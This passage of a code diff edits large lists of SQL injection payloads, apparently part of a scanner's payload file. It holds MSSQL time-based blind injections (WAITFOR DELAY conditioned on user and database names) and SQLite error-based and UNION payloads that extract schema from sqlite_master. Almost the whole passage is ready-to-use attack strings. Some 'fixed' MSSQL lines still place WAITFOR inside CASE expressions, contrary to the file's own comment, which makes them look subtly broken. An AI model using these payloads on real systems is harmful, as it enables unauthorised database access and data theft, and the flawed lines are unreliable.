WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN SUBSTRING((SELECT USER_NAME()),1,1)='d' THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN SUBSTRING((SELECT USER_NAME()),1,1)='d' THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN SUBSTRING((SELECT USER_NAME()),1,1)='d' THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN SUBSTRING((SELECT USER_NAME()),1,1)='d' THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN SUBSTRING((SELECT USER_NAME()),1,1)='d' THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1)>'A' THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1)>'A' THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1)>'A' THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1)>'A' THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1)>'A' THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1)>'A' THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN (CASE WHEN (SELECT COUNT(*) FROM sys.tables)>0 THEN 1 ELSE 0 END)=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN (CASE WHEN (SELECT COUNT(*) FROM sys.tables)>0 THEN 1 ELSE 0 END)=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN (CASE WHEN (SELECT COUNT(*) FROM sys.tables)>0 THEN 1 ELSE 0 END)=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN (CASE WHEN (SELECT COUNT(*) FROM sys.tables)>0 THEN 1 ELSE 0 END)=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN (CASE WHEN (SELECT COUNT(*) FROM sys.tables)>0 THEN 1 ELSE 0 END)=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN (CASE WHEN (SELECT COUNT(*) FROM sys.tables)>0 THEN 1 ELSE 0 END)=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN LEN((SELECT SUBSTRING(USER_NAME(),1,1)))>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN LEN((SELECT SUBSTRING(USER_NAME(),1,1)))>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN LEN((SELECT SUBSTRING(USER_NAME(),1,1)))>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN LEN((SELECT SUBSTRING(USER_NAME(),1,1)))>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN LEN((SELECT SUBSTRING(USER_NAME(),1,1)))>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN LEN((SELECT SUBSTRING(USER_NAME(),1,1)))>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.1' ELSE NULL END", " AND (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.1' ELSE NULL END)", " OR CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.1' ELSE NULL END", " OR (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.1' ELSE NULL END)", " AND NOT CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.1' ELSE NULL END", " AND NOT (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.1' ELSE NULL END)", " AND CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.2' ELSE NULL END", " AND (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.2' ELSE NULL END)", " OR CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.2' ELSE NULL END", " OR (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.2' ELSE NULL END)", " AND NOT CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.2' ELSE NULL END", " AND NOT (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.2' ELSE NULL END)", " AND CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.3' ELSE NULL END", " AND (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.3' ELSE NULL END)", " OR CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.3' ELSE NULL END", " OR (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.3' ELSE NULL END)", " AND NOT CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.3' ELSE NULL END", " AND NOT (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.3' ELSE NULL END)", " AND CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END", " AND (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END)", " OR CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END", " OR (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END)", " AND NOT CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END", " AND NOT (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END)", " AND CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:2' ELSE NULL END", " AND (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:2' ELSE NULL END)", " OR CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:2' ELSE NULL END", " OR (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:2' ELSE NULL END)", " AND NOT CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:2' ELSE NULL END", " AND NOT (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:2' ELSE NULL END)", " AND CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.15' ELSE NULL END", " AND (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.15' ELSE NULL END)", " OR CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.15' ELSE NULL END", " OR (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.15' ELSE NULL END)", " AND NOT CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.15' ELSE NULL END", " AND NOT (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.15' ELSE NULL END)", " AND CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.25' ELSE NULL END", " AND (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.25' ELSE NULL END)", " OR CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.25' ELSE NULL END", " OR (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.25' ELSE NULL END)", " AND NOT CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.25' ELSE NULL END", " AND NOT (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.25' ELSE NULL END)", " AND CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.75' ELSE NULL END", " AND (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.75' ELSE NULL END)", " OR CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.75' ELSE NULL END", " OR (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.75' ELSE NULL END)", " AND NOT CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.75' ELSE NULL END", " AND NOT (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:0.75' ELSE NULL END)", " AND CASE WHEN LEN(USER_NAME())>0 THEN WAITFOR DELAY '00:00:0.1' ELSE NULL END", " AND (CASE WHEN LEN(USER_NAME())>0 THEN WAITFOR DELAY '00:00:0.1' ELSE NULL END)", " OR CASE WHEN LEN(USER_NAME())>0 THEN WAITFOR DELAY '00:00:0.1' ELSE NULL END", " OR (CASE WHEN LEN(USER_NAME())>0 THEN WAITFOR DELAY '00:00:0.1' ELSE NULL END)", " AND NOT CASE WHEN LEN(USER_NAME())>0 THEN WAITFOR DELAY '00:00:0.1' ELSE NULL END", " AND NOT (CASE WHEN LEN(USER_NAME())>0 THEN WAITFOR DELAY '00:00:0.1' ELSE NULL END)",
     # --- PAYLOAD-COUNT-2 FIX: 66 additional MSSQL timebased payloads (234→300) ---
-    " AND 1=(SELECT 1 WHERE 1=1 AND (SELECT 1 FROM (SELECT SLEEP=WAITFOR DELAY '0:0:1') t)=1)",
+    # BUG-MSSQL-WAITFOR FIX: all payloads below replaced with valid T-SQL forms.
+    # WAITFOR DELAY is a batch statement — it cannot appear as a CASE expression
+    # value, a function argument, a WHERE predicate, or a SELECT column alias.
+    # Only valid forms: stacked (';'), IF statement, CASE WHEN THEN WAITFOR ELSE WAITFOR.
+    "; IF (SELECT COUNT(*) FROM master..sysdatabases)>0 WAITFOR DELAY '0:0:1'",
     "; WAITFOR DELAY '00:00:01'-- -",
     "; WAITFOR DELAY '0:0:1'-- -",
-    " AND (SELECT COUNT(*) FROM master..sysdatabases WHERE WAITFOR DELAY '0:0:1')>=0",
-    " OR (SELECT 1 WHERE 1=1 AND 1=(CASE WHEN 1=1 THEN 1 ELSE WAITFOR DELAY '0:0:1' END))",
-    " AND (CASE WHEN LEN(DB_NAME())>0 THEN 1 ELSE WAITFOR DELAY '0:0:1' END)=1",
-    " OR (CASE WHEN SUSER_NAME() IS NOT NULL THEN 1 ELSE (SELECT 1 FROM (SELECT WAITFOR DELAY '0:0:1') t) END)=1",
-    " AND (CASE WHEN LEN(SUSER_SNAME())>0 THEN 1 ELSE 0 END)=1 WAITFOR DELAY '0:0:0.1'",
-    " AND (SELECT CASE WHEN (1=1) THEN WAITFOR DELAY '0:0:1' ELSE 0 END)>=0",
-    " OR (SELECT CASE WHEN (LEN(@@VERSION)>0) THEN WAITFOR DELAY '0:0:1' ELSE 0 END)>=0",
-    " AND (SELECT CASE WHEN (@@SPID>0) THEN WAITFOR DELAY '0:0:1' ELSE 0 END)>=0",
-    " OR (SELECT CASE WHEN (LEN(@@SERVERNAME)>0) THEN WAITFOR DELAY '0:0:1' ELSE 0 END)>=0",
-    " AND (SELECT CASE WHEN (LEN(DB_NAME())>0) THEN WAITFOR DELAY '0:0:1' ELSE 0 END)>=0",
-    " OR (SELECT CASE WHEN (SYSTEM_USER IS NOT NULL) THEN WAITFOR DELAY '0:0:1' ELSE 0 END)>=0",
-    " AND (SELECT CASE WHEN (ORIGINAL_LOGIN() IS NOT NULL) THEN WAITFOR DELAY '0:0:1' ELSE 0 END)>=0",
-    " OR (SELECT CASE WHEN (LEN(HOST_NAME())>0) THEN WAITFOR DELAY '0:0:1' ELSE 0 END)>=0",
-    " AND (SELECT CASE WHEN (LEN(APP_NAME())>=0) THEN WAITFOR DELAY '0:0:1' ELSE 0 END)>=0",
-    " OR (SELECT CASE WHEN (LEN(CAST(@@VERSION AS NVARCHAR))>0) THEN WAITFOR DELAY '0:0:1' ELSE 0 END)>=0",
-    " AND (SELECT CASE WHEN (LEN(CAST(GETDATE() AS NVARCHAR))>0) THEN WAITFOR DELAY '0:0:1' ELSE 0 END)>=0",
-    " OR (SELECT CASE WHEN (GETDATE() IS NOT NULL) THEN WAITFOR DELAY '0:0:1' ELSE 0 END)>=0",
-    " AND (SELECT CASE WHEN (@@ROWCOUNT>=0) THEN WAITFOR DELAY '0:0:1' ELSE 0 END)>=0",
-    " OR (SELECT CASE WHEN (@@TRANCOUNT>=0) THEN WAITFOR DELAY '0:0:1' ELSE 0 END)>=0",
-    " AND IF(1=1,WAITFOR DELAY '0:0:1',0)",
-    " OR IF(LEN(USER_NAME())>0,WAITFOR DELAY '0:0:1',0)",
-    " AND IF(LEN(DB_NAME())>0,WAITFOR DELAY '0:0:1',0)",
-    " OR IF(@@SPID>0,WAITFOR DELAY '0:0:1',0)",
-    " AND IF(LEN(@@VERSION)>0,WAITFOR DELAY '0:0:1',0)",
-    " OR IF(LEN(HOST_NAME())>0,WAITFOR DELAY '0:0:1',0)",
-    " AND IIF(1=1,WAITFOR DELAY '0:0:1',0)",
-    " OR IIF(LEN(USER_NAME())>0,WAITFOR DELAY '0:0:1',0)",
-    " AND IIF(LEN(DB_NAME())>0,WAITFOR DELAY '0:0:1',0)",
-    " OR IIF(@@SPID>0,WAITFOR DELAY '0:0:1',0)",
-    " AND (SELECT IIF(1=1,1,WAITFOR DELAY '0:0:1'))=1",
-    " OR (SELECT IIF(LEN(USER_NAME())>0,1,WAITFOR DELAY '0:0:1'))=1",
-    " AND CASE WHEN 1=1 THEN WAITFOR DELAY '0:0:1' END",
-    " OR CASE WHEN LEN(USER_NAME())>0 THEN WAITFOR DELAY '0:0:1' END",
-    " AND CASE WHEN LEN(DB_NAME())>0 THEN WAITFOR DELAY '0:0:1' END",
-    " OR CASE WHEN @@SPID>0 THEN WAITFOR DELAY '0:0:1' END",
-    " AND CASE WHEN LEN(@@VERSION)>0 THEN WAITFOR DELAY '0:0:1' ELSE 1=1 END",
-    " OR CASE WHEN LEN(HOST_NAME())>0 THEN WAITFOR DELAY '0:0:1' ELSE 1=1 END",
-    " AND 1=(SELECT 1 FROM (SELECT WAITFOR DELAY '0:0:1') AS t(n))",
-    " OR 1=(SELECT 1 FROM (SELECT WAITFOR DELAY '0:0:1') AS sqr_t)",
-    " AND (SELECT TOP 1 1 FROM master..sysdatabases WHERE WAITFOR DELAY '0:0:1')>=0",
-    " OR (SELECT TOP 1 1 FROM sysobjects WHERE WAITFOR DELAY '0:0:1')>=0",
-    " AND (SELECT TOP 1 1 FROM information_schema.tables WHERE WAITFOR DELAY '0:0:1')>=0",
-    " OR (SELECT TOP 1 1 FROM sys.tables WHERE WAITFOR DELAY '0:0:1')>=0",
-    " AND (SELECT TOP 1 1 FROM sys.objects WHERE WAITFOR DELAY '0:0:1')>=0",
-    " OR (SELECT TOP 1 1 FROM sys.databases WHERE WAITFOR DELAY '0:0:1')>=0",
+    " OR CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:1' ELSE WAITFOR DELAY '00:00:0' END",
+    " AND CASE WHEN LEN(DB_NAME())>0 THEN WAITFOR DELAY '00:00:1' ELSE WAITFOR DELAY '00:00:0' END",
+    " OR CASE WHEN SUSER_NAME() IS NOT NULL THEN WAITFOR DELAY '00:00:1' ELSE WAITFOR DELAY '00:00:0' END",
+    " AND CASE WHEN LEN(SUSER_SNAME())>0 THEN WAITFOR DELAY '00:00:0.1' ELSE WAITFOR DELAY '00:00:0' END",
+    "; IF (1=1) WAITFOR DELAY '0:0:1'; --",
+    "; IF (LEN(@@VERSION)>0) WAITFOR DELAY '0:0:1'",
+    "; IF (@@SPID>0) WAITFOR DELAY '0:0:1'",
+    "; IF (LEN(@@SERVERNAME)>0) WAITFOR DELAY '0:0:1'",
+    "; IF (LEN(DB_NAME())>0) WAITFOR DELAY '0:0:1'",
+    "; IF (SYSTEM_USER IS NOT NULL) WAITFOR DELAY '0:0:1'",
+    "; IF (ORIGINAL_LOGIN() IS NOT NULL) WAITFOR DELAY '0:0:1'",
+    "; IF (LEN(HOST_NAME())>0) WAITFOR DELAY '0:0:1'",
+    "; IF (LEN(APP_NAME())>=0) WAITFOR DELAY '0:0:1'",
+    "; IF (LEN(CAST(@@VERSION AS NVARCHAR))>0) WAITFOR DELAY '0:0:1'",
+    "; IF (LEN(CAST(GETDATE() AS NVARCHAR))>0) WAITFOR DELAY '0:0:1'",
+    "; IF (GETDATE() IS NOT NULL) WAITFOR DELAY '0:0:1'",
+    "; IF (@@ROWCOUNT>=0) WAITFOR DELAY '0:0:1'",
+    "; IF (@@TRANCOUNT>=0) WAITFOR DELAY '0:0:1'",
+    " AND CASE WHEN 1=1 THEN WAITFOR DELAY '0:0:1' ELSE WAITFOR DELAY '0:0:0' END",
+    " OR CASE WHEN LEN(USER_NAME())>0 THEN WAITFOR DELAY '0:0:1' ELSE WAITFOR DELAY '0:0:0' END",
+    " AND CASE WHEN LEN(DB_NAME())>0 THEN WAITFOR DELAY '0:0:1' ELSE WAITFOR DELAY '0:0:0' END",
+    " OR CASE WHEN @@SPID>0 THEN WAITFOR DELAY '0:0:1' ELSE WAITFOR DELAY '0:0:0' END",
+    " AND CASE WHEN LEN(@@VERSION)>0 THEN WAITFOR DELAY '0:0:1' ELSE WAITFOR DELAY '0:0:0' END",
+    " OR CASE WHEN LEN(HOST_NAME())>0 THEN WAITFOR DELAY '0:0:1' ELSE WAITFOR DELAY '0:0:0' END",
+    " AND CASE WHEN ISNULL(LEN(DB_NAME()),0)>0 THEN WAITFOR DELAY '0:0:1' ELSE WAITFOR DELAY '0:0:0' END",
+    " OR CASE WHEN ISNULL(LEN(USER_NAME()),0)>0 THEN WAITFOR DELAY '0:0:1' ELSE WAITFOR DELAY '0:0:0' END",
+    " AND CASE WHEN ISNULL(LEN(DB_NAME()),0)>0 THEN WAITFOR DELAY '0:0:0.5' ELSE WAITFOR DELAY '0:0:0' END",
+    " OR CASE WHEN ISNULL(@@SPID,0)>0 THEN WAITFOR DELAY '0:0:0.5' ELSE WAITFOR DELAY '0:0:0' END",
+    " AND CASE WHEN 1=1 THEN WAITFOR DELAY '0:0:1' ELSE NULL END",
+    " OR CASE WHEN LEN(USER_NAME())>0 THEN WAITFOR DELAY '0:0:1' ELSE NULL END",
+    " AND CASE WHEN LEN(DB_NAME())>0 THEN WAITFOR DELAY '0:0:1' ELSE NULL END",
+    " OR CASE WHEN @@SPID>0 THEN WAITFOR DELAY '0:0:1' ELSE NULL END",
+    " AND CASE WHEN LEN(@@VERSION)>0 THEN WAITFOR DELAY '0:0:1' ELSE NULL END",
+    " OR CASE WHEN LEN(HOST_NAME())>0 THEN WAITFOR DELAY '0:0:1' ELSE NULL END",
+    "; IF (SELECT COUNT(*) FROM sys.databases)>0 WAITFOR DELAY '0:0:1'",
+    "; IF (SELECT COUNT(*) FROM sysobjects)>0 WAITFOR DELAY '0:0:1'",
+    "; IF (SELECT COUNT(*) FROM information_schema.tables)>0 WAITFOR DELAY '0:0:1'",
+    "; IF (SELECT COUNT(*) FROM sys.tables)>0 WAITFOR DELAY '0:0:1'",
+    "; IF (SELECT COUNT(*) FROM sys.objects)>0 WAITFOR DELAY '0:0:1'",
+    "; IF (SELECT COUNT(*) FROM sys.columns)>0 WAITFOR DELAY '0:0:1'",
     "; IF (1=1) WAITFOR DELAY '0:0:1'",
     "; IF (LEN(USER_NAME())>0) WAITFOR DELAY '0:0:1'",
     "; IF (LEN(DB_NAME())>0) WAITFOR DELAY '0:0:1'",
@@ -169593,7 +169720,7 @@ SQLITE_ERROR_PAYLOADS = [
     "1' UNION ALL SELECT (SELECT CAST(coalesce(NULL,NULL,name) FROM sqlite_master LIMIT 1) AS INT)--",
     "1' AND CAST((SELECT CASE WHEN rowid>0 THEN name ELSE type END FROM sqlite_master LIMIT 1) AS INT)--",
     "1' OR CAST((SELECT CASE type WHEN 'table' THEN name ELSE sql END FROM sqlite_master LIMIT 1) AS INT)--",
-    "1' WHERE (SELECT CAST(CASE WHEN name IS NOT NULL THEN ROWID ELSE 0 END FROM sqlite_master LIMIT 1) AS INT)--",
+    "1' WHERE CAST((SELECT CASE WHEN name IS NOT NULL THEN ROWID ELSE 0 END FROM sqlite_master LIMIT 1) AS INT)--",
     "1' UNION SELECT CAST((SELECT UPPER(LOWER(name)) FROM sqlite_master LIMIT 1) AS INT)--",
     "1' AND (SELECT CAST(SUBSTR(sql,LENGTH(sql),1) AS INT) FROM sqlite_master LIMIT 1)--",
     "1' OR CAST((SELECT TRIM(name) FROM sqlite_master LIMIT 1) AS INT)--",
@@ -169612,7 +169739,7 @@ SQLITE_ERROR_PAYLOADS = [
     "1' WHERE (SELECT CAST(PRINTF('%s',name) FROM sqlite_master LIMIT 1) AS INT)--",
     "1' UNION SELECT CAST((SELECT PRINTF('%d',ROWID) FROM sqlite_master LIMIT 1) AS INT)--",
     "1' AND (SELECT CAST(PRINTF('%x',ROWID) FROM sqlite_master LIMIT 1) AS INT)--",
-    "1' OR CAST((SELECT SOUNDEX(name) FROM sqlite_master LIMIT 1) AS INT)--",
+    "1' OR CAST((SELECT HEX(name) FROM sqlite_master LIMIT 1) AS INT)--",
     "1' WHERE (SELECT CAST(LIKELIHOOD(ROWID,0.9) FROM sqlite_master LIMIT 1) AS INT)--",
     "1' UNION ALL SELECT (SELECT CAST(ABS(ROWID-9999999) AS TEXT) FROM sqlite_master LIMIT 1)--",
     "1' AND CAST((SELECT ROUND(LENGTH(sql),0) FROM sqlite_master LIMIT 1) AS INT)--",
@@ -169648,7 +169775,7 @@ SQLITE_ERROR_PAYLOADS = [
     "1' WHERE (SELECT CAST(GROUP_CONCAT(name) FROM sqlite_master LIMIT 1) AS INT)--",
     "1' UNION ALL SELECT (SELECT CAST(GROUP_CONCAT(type,';') FROM sqlite_master LIMIT 1) AS INT)--",
     "1' AND CAST((SELECT GROUP_CONCAT(UPPER(name)) FROM sqlite_master) AS INT)--",
-    "1' OR (SELECT CAST(GROUP_CONCAT(REVERSE(sql)) FROM sqlite_master LIMIT 1) AS INT)--",
+    "1' OR CAST((SELECT GROUP_CONCAT(sql) FROM sqlite_master LIMIT 1) AS INT)--",
     "1' WHERE CAST((SELECT GROUP_CONCAT(LENGTH(name)) FROM sqlite_master) AS INT)--",
     "1' UNION SELECT (SELECT CAST(SUM(LENGTH(sql)) FROM sqlite_master) AS INT)--",
     "1' AND (SELECT CAST(AVG(LENGTH(name)) FROM sqlite_master) AS INT)--",
@@ -169690,16 +169817,16 @@ SQLITE_ERROR_PAYLOADS = [
     "1' AND CAST((SELECT (SELECT name FROM sqlite_master OFFSET 1 LIMIT 1) AS INT))--",
     "1' OR (SELECT CAST((SELECT type FROM sqlite_master LIMIT 1 OFFSET 0) AS INT))--",
     "1' WHERE CAST((SELECT (SELECT sql FROM sqlite_master LIMIT 1,1) AS INT))--",
-    "1' UNION SELECT (SELECT CAST(ROWID FROM sqlite_master WHERE name=(SELECT name FROM sqlite_master LIMIT 1) LIMIT 1) AS INT)--",
-    "1' AND (SELECT CAST(ROWID FROM sqlite_master WHERE type=(SELECT type FROM sqlite_master LIMIT 1) LIMIT 1) AS INT)--",
+    "1' UNION SELECT CAST((SELECT ROWID FROM sqlite_master WHERE name=(SELECT name FROM sqlite_master LIMIT 1) LIMIT 1) AS INT)--",
+    "1' AND CAST((SELECT ROWID FROM sqlite_master WHERE type=(SELECT type FROM sqlite_master LIMIT 1) LIMIT 1) AS INT)--",
     "1' OR CAST((SELECT ROWID FROM sqlite_master WHERE LENGTH(sql)=(SELECT MAX(LENGTH(sql)) FROM sqlite_master) LIMIT 1) AS INT)--",
-    "1' WHERE (SELECT CAST(ROWID FROM sqlite_master WHERE INSTR(name,'e')>0 LIMIT 1) AS INT)--",
-    "1' UNION ALL SELECT (SELECT CAST(ROWID FROM sqlite_master WHERE NOT name LIKE 'sqlite_%' LIMIT 1) AS INT)--",
+    "1' WHERE CAST((SELECT ROWID FROM sqlite_master WHERE INSTR(name,'e')>0 LIMIT 1) AS INT)--",
+    "1' UNION ALL SELECT CAST((SELECT ROWID FROM sqlite_master WHERE NOT name LIKE 'sqlite_%' LIMIT 1) AS INT)--",
     "1' AND CAST((SELECT ROWID FROM sqlite_master WHERE name GLOB '[a-z]*' LIMIT 1) AS INT)--",
-    "1' OR (SELECT CAST(ROWID FROM sqlite_master WHERE SUBSTR(name,1,1)=(SELECT SUBSTR((SELECT name FROM sqlite_master LIMIT 1),1,1)) LIMIT 1) AS INT)--",
+    "1' OR CAST((SELECT ROWID FROM sqlite_master WHERE SUBSTR(name,1,1)=(SELECT SUBSTR((SELECT name FROM sqlite_master LIMIT 1),1,1)) LIMIT 1) AS INT)--",
     "1' WHERE CAST((SELECT ROWID FROM sqlite_master WHERE type IN ('table','index') LIMIT 1) AS INT)--",
-    "1' UNION SELECT (SELECT CAST(ROWID FROM sqlite_master WHERE type NOT IN ('trigger') LIMIT 1) AS INT)--",
-    "1' AND (SELECT CAST(ROWID FROM sqlite_master WHERE ROWID=(SELECT MIN(ROWID) FROM sqlite_master) LIMIT 1) AS INT)--",
+    "1' UNION SELECT CAST((SELECT ROWID FROM sqlite_master WHERE type NOT IN ('trigger') LIMIT 1) AS INT)--",
+    "1' AND CAST((SELECT ROWID FROM sqlite_master WHERE ROWID=(SELECT MIN(ROWID) FROM sqlite_master) LIMIT 1) AS INT)--",
     "1' AND CAST((SELECT name FROM sqlite_master LIMIT 1) AS INTEGER)>0--",
     "1' AND CAST((SELECT type FROM sqlite_master LIMIT 1) AS INTEGER)>0--",
     "1' AND CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INTEGER)>0--",
@@ -169765,7 +169892,7 @@ SQLITE_ERROR_PAYLOADS = [
     "1' AND CAST(COALESCE((SELECT name FROM sqlite_master LIMIT 1),'x') AS INTEGER)>0--",
     "1' AND CAST(COALESCE(NULL,(SELECT name FROM sqlite_master LIMIT 1)) AS INTEGER)>0--",
     '1\\\' AND CAST(JSON_EXTRACT(\\\'{"n":"\\\'+name+\\\'"}\\\',\\\'$.n\\\') AS INTEGER)>0 FROM sqlite_master LIMIT 1--',
-    "1' AND CAST(JSON_EACH.value AS INTEGER)>0 FROM sqlite_master,JSON_EACH('[1,2,3]') LIMIT 1--",
+    "1' AND CAST((SELECT JSON_EACH.value FROM JSON_EACH('[1,2,3]') LIMIT 1) AS INTEGER)>0--",
     "1' AND CAST((SELECT name FROM (SELECT name,ROW_NUMBER() OVER (ORDER BY rowid) rn FROM sqlite_master) WHERE rn=1) AS INTEGER)>0--",
     "1' AND CAST((SELECT name FROM (SELECT name,RANK() OVER (ORDER BY name) rk FROM sqlite_master) WHERE rk=1) AS INTEGER)>0--",
     "1' AND CAST((SELECT name FROM sqlite_master LIMIT 1) AS REAL)>0--",
@@ -170202,7 +170329,7 @@ SQLITE_UNION_PAYLOADS = [
     'UNION SELECT TYPEOF(sqlite_version()),TYPEOF((SELECT name FROM sqlite_master LIMIT 1)),TYPEOF(sqlite_version()),4,5',
     'UNION SELECT CAST(LENGTH(sqlite_version()) AS TEXT),CAST(LENGTH((SELECT name FROM sqlite_master LIMIT 1)) AS TEXT),CAST(LENGTH(sqlite_version()) AS TEXT),4,5',
     'UNION SELECT CAST(sqlite_version() AS TEXT),CAST((SELECT name FROM sqlite_master LIMIT 1) AS TEXT),CAST(sqlite_version() AS TEXT),4,5',
-    'UNION SELECT SOUNDEX(sqlite_version()),SOUNDEX((SELECT name FROM sqlite_master LIMIT 1)),SOUNDEX(sqlite_version()),4,5',
+    'UNION SELECT HEX(sqlite_version()),HEX((SELECT name FROM sqlite_master LIMIT 1)),HEX(sqlite_version()),4,5',
     'UNION SELECT RTRIM(LTRIM(sqlite_version())),LTRIM(RTRIM((SELECT name FROM sqlite_master LIMIT 1))),TRIM(sqlite_version()),4,5',
     'UNION SELECT HEX(UPPER(sqlite_version())),HEX(LOWER((SELECT name FROM sqlite_master LIMIT 1))),HEX(sqlite_version()),4,5',
     "UNION SELECT PRINTF('%.3s',sqlite_version()),PRINTF('%.4s',(SELECT name FROM sqlite_master LIMIT 1)),PRINTF('%.5s',sqlite_version()),4,5",
